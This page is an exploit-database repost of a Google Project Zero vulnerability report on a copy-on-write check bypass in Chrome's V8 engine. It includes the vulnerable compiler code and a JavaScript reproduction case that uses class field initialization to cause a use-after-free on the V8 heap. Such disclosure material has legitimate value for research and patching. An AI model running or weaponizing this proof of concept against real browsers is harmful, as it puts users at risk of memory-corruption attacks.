---
title: Chrome JSNativeContextSpecialization::BuildElementAccess Bypass exploit
url: https://sploitus.com/exploit?id=PACKETSTORM:170581&utm_source=rss&utm_medium=rss
source: Sploitus.com Exploits RSS Feed
date: 2023-01-19
fetch_date: 2025-10-04T04:14:05.281218
---

# Chrome JSNativeContextSpecialization::BuildElementAccess Bypass exploit

[x]
Dark Mode

[##### SPLOITUS](/)

# Exploit for Chrome JSNativeContextSpecialization::BuildElementAccess Bypass

2023-01-18 | CVSS 0.3

Copy
Download
Source
[Share](#share-url)

```
## https://sploitus.com/exploit?id=PACKETSTORM:170581
Chrome: Copy-on-write check bypass in JSNativeContextSpecialization::BuildElementAccess

VULNERABILITY DETAILS
Copy-on-write is one of V8's internal optimization features that allows multiple JavaScript objects to share the same element store. This feature is primarily used to optimize creation of JavaScript arrays from literals. It's important that every function that can add a new element to a JS object or modify an existing one first checks that the element store isn't marked as COW and makes a copy of the store if needed. Otherwise, the element will be unexpectedly changed for every object that uses the same store.

Consider the implementation of the safety check in `JSNativeContextSpecialization::BuildElementAccess`:

```
JSNativeContextSpecialization::ValueEffectControl
JSNativeContextSpecialization::BuildElementAccess(
Node* receiver, Node* index, Node* value, Node* effect, Node* control,
Node* context, ElementAccessInfo const& access_info,
KeyedAccessMode const& keyed_mode) {
[...]
if (keyed_mode.access_mode() == AccessMode::kStore &&
IsSmiOrObjectElementsKind(elements_kind) &&
!IsCOWHandlingStoreMode(keyed_mode.store_mode())) {
effect = graph()->NewNode(
simplified()->CheckMaps(
CheckMapsFlag::kNone,
ZoneHandleSet<Map>(factory()->fixed_array_map())),
elements, effect, control);
}
[...]
}
```

The `CheckMaps` node is only inserted if the current access mode is `kStore`. However, there are other modes that can also result in storing an element, and one of them is `kDefine`. A call to the `Object.defineProperty` function won't lead to an access in this mode, but an attacker can take advantage of class field initialization to trigger it:

```
function ReturnHolder() { return define_property_holder }
class Trigger extends ReturnHolder { 123 = new_value; }
```

The `Trigger` constructor will perform an element access that's equivalent to the expression `define_property_holder[123] = new_value`, but will set the access mode to `kDefine`, thus bypassing the safety check.

There are likely multiple ways to exploit the issue. The approach the attached reproduction case takes is to create two `PACKED_SMI_ELEMENTS` arrays that share the element store and then get one of the arrays to transition to the `PACKED_ELEMENTS` kind and store a `HeapObject` element. Since copying elements from the corrupted Smi array to another Smi array won't trigger any write barriers, we can hide the pointer from the garbage collector in a new array and trigger a use-after-free on a V8 heap address.

VERSION
V8 version 10.9.0 (candidate)
Google Chrome 107.0.5304.87 (Official Build) (64-bit)

REPRODUCTION CASE
```
function ForceGC() { try { new ArrayBuffer(2 ** 34); } catch {} }

old_space_array = Array(1, 2);

function CopyElement(from, to) { to[0] = from[0]; } // no write barrier for smi arrays
for (let i = 0; i < 10000; ++i) {
CopyElement(old_space_array, old_space_array);
}

ForceGC();

function MakeCOW() { return [0]; }
original_cow_object = MakeCOW();

function MakeCopy() {
let copy = original_cow_object.concat(); // create a new object with COW elements
copy.splice(); // copy the elements
return copy;
}

new_value = 1;
new_value = {}; // mark the cell as mutable

function ReturnHolder() { return define_property_holder }
class Trigger extends ReturnHolder { 0 = new_value; }

for (let i = 0; i < 10000; ++i) {
define_property_holder = MakeCopy();
new Trigger();
}

new_value = {};
define_property_holder = MakeCOW();
new Trigger();

new_space_array = MakeCOW();
new_space_array.splice();

CopyElement(new_space_array, old_space_array);

new_value = \"\";
define_property_holder = MakeCOW();
new Trigger();

new_space_array = null;
ForceGC();

console.log(old_space_array[0][0]);

```

CREDIT INFORMATION
Sergei Glazunov of Google Project Zero

This bug is subject to a 90-day disclosure deadline. If a fix for this issue is made available to users before the end of the 90-day deadline, this bug report will become public 30 days after the fix was made available. Otherwise, this bug report will become public at the deadline. The scheduled deadline is 2023-02-06.

Found by: glazunov@google.com
```

Share

Copy

![](https://mc.yandex.ru/watch/54912310)